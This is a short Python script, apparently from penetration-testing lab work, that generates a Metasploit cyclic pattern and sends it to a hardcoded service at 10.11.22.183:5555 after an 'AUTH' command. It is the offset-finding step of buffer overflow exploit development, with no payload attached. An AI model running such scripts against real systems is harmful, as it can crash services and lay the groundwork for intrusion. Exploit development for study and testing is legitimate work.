#!/usr/bin/python
import subprocess
import socket
import sys

pattern = subprocess.check_output("/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {}".format(sys.argv[1]), shell=True)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.11.22.183", 5555))
s.send("AUTH {}".format(pattern))
